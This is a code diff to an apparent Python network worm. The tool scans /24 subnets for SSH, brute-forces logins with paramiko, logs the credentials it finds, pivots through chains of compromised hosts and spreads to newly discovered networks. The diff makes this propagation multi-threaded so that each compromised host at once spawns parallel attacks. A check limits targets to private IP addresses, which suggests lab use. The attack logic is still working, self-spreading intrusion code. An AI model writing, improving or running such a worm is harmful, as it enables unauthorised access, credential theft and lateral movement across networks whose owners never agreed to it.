@@ -38,6 +38,7 @@ import json
 import subprocess
 import sys
 import re
+import threading
 from datetime import datetime
 from collections import defaultdict
 
@@ -73,6 +74,7 @@ def is_safe_target(ip: str) -> bool:
 # ── Infection state ───────────────────────────────────────────────────────────
 compromised = {}     # ip -> {user, password, via}
 scanned_nets = set() # network prefixes already scanned
+_state_lock = threading.Lock()
 
 def log(msg: str, level: str = "info"):
     ts = datetime.now().strftime("%H:%M:%S")
@@ -131,9 +133,10 @@ def probe_ssh(ip: str, timeout: float = 1.0) -> bool:
 
 def scan_network(prefix: str) -> list[str]:
     """Scan a /24 network for SSH targets. Returns list of live IPs."""
-    if prefix in scanned_nets:
-        return []
-    scanned_nets.add(prefix)
+    with _state_lock:
+        if prefix in scanned_nets:
+            return []
+        scanned_nets.add(prefix)
     log(f"Scanning {prefix}0/24 for SSH targets...", "info")
     live = []
     for i in range(1, 255):
@@ -160,9 +163,10 @@ def brute_force(target: str, delay: float = 0.5, via: str = "direct") -> dict | 
         log(f"  SAFETY: {target} is not a private IP — skipping", "warn")
         return None
 
-    if target in compromised:
-        log(f"  {target} already compromised — skipping", "info")
-        return compromised[target]
+    with _state_lock:
+        if target in compromised:
+            log(f"  {target} already compromised — skipping", "info")
+            return compromised[target]
 
     log(f"Brute-forcing {target} (via {via})...", "attack")
 
@@ -183,7 +187,8 @@ def brute_force(target: str, delay: float = 0.5, via: str = "direct") -> dict | 
             log(f"  [{attempt:03d}] CREDENTIAL FOUND: {username}:{password} @ {target}", "pwned")
             client.close()
             cred = {"user": username, "password": password, "via": via, "attempts": attempt}
-            compromised[target] = cred
+            with _state_lock:
+                compromised[target] = cred
             return cred
         except paramiko.AuthenticationException:
             log(f"  [{attempt:03d}] FAILED {username}:{password}", "info") if attempt % 10 == 0 else None
@@ -208,9 +213,10 @@ def build_ssh_chain(via: str) -> list:
 
 def scan_network_via_chain(prefix: str, via: str) -> list:
     """Scan a /24 by running a shell command on the pivot host over SSH."""
-    if prefix in scanned_nets:
-        return []
-    scanned_nets.add(prefix)
+    with _state_lock:
+        if prefix in scanned_nets:
+            return []
+        scanned_nets.add(prefix)
     log(f"Scanning {prefix}0/24 for SSH targets (via {via})...", "info")
 
     chain = build_ssh_chain(via)
@@ -352,8 +358,9 @@ def brute_force_via_chain(target: str, via: str, delay: float = 0.5) -> dict | N
     """Brute-force a target by tunnelling through a chain of compromised pivots."""
     if not HAS_PARAMIKO:
         return None
-    if target in compromised:
-        return compromised[target]
+    with _state_lock:
+        if target in compromised:
+            return compromised[target]
 
     chain = build_ssh_chain(via)
     if not chain:
@@ -407,7 +414,8 @@ def brute_force_via_chain(target: str, via: str, delay: float = 0.5) -> dict | N
                     t_tgt.auth_password(username, password)
                     log(f"  [{attempt:03d}] CREDENTIAL FOUND: {username}:{password} @ {target}", "pwned")
                     cred = {"user": username, "password": password, "via": via, "attempts": attempt}
-                    compromised[target] = cred
+                    with _state_lock:
+                        compromised[target] = cred
                     result = cred
                     t_tgt.close()
                     t_tgt = None
@@ -439,14 +447,16 @@ def brute_force_via_chain(target: str, via: str, delay: float = 0.5) -> dict | N
 # ── Propagation engine ────────────────────────────────────────────────────────
 def propagate(queue: list, delay: float):
     """
-    Process a queue of (ip, via_host) pairs.
-    For each: brute-force (direct or via SSH chain), then discover new networks.
+    Attack all targets in parallel — each compromised host immediately spawns
+    threads for newly discovered networks instead of waiting for the queue.
     """
-    while queue:
-        target_ip, via = queue.pop(0)
+    all_threads = []
+    all_threads_lock = threading.Lock()
 
-        if target_ip in compromised:
-            continue
+    def handle(target_ip, via):
+        with _state_lock:
+            if target_ip in compromised:
+                return
 
         if via == "direct":
             cred = brute_force(target_ip, delay=delay, via=via)
@@ -454,22 +464,41 @@ def propagate(queue: list, delay: float):
             cred = brute_force_via_chain(target_ip, via=via, delay=delay)
 
         if not cred:
-            continue
+            return
 
-        # Discover networks reachable from the newly compromised host
         log(f"Discovering networks from compromised {target_ip}...", "pivot")
         new_nets = get_networks_from_host_via_chain(
             target_ip, cred["user"], cred["password"], via
         )
 
         for net in new_nets:
-            if net not in scanned_nets:
-                log(f"  New network discovered: {net}0/24 (via {target_ip})", "pivot")
-                # Scan the new network from target_ip's perspective
-                new_targets = scan_network_via_chain(net, target_ip)
-                for t in new_targets:
-                    if t not in compromised and t != target_ip:
-                        queue.append((t, target_ip))
+            log(f"  New network discovered: {net}0/24 (via {target_ip})", "pivot")
+            new_targets = scan_network_via_chain(net, target_ip)
+            for t_ip in new_targets:
+                with _state_lock:
+                    if t_ip in compromised or t_ip == target_ip:
+                        continue
+                th = threading.Thread(target=handle, args=(t_ip, target_ip), daemon=True)
+                with all_threads_lock:
+                    all_threads.append(th)
+                th.start()
+
+    for target_ip, via in queue:
+        th = threading.Thread(target=handle, args=(target_ip, via), daemon=True)
+        with all_threads_lock:
+            all_threads.append(th)
+        th.start()
+
+    # Join threads including ones spawned dynamically during execution
+    joined = 0
+    while True:
+        with all_threads_lock:
+            batch = list(all_threads[joined:])
+        if not batch:
+            break
+        for th in batch:
+            th.join()
+        joined += len(batch)
 
 # ── Report ────────────────────────────────────────────────────────────────────
 def print_report():
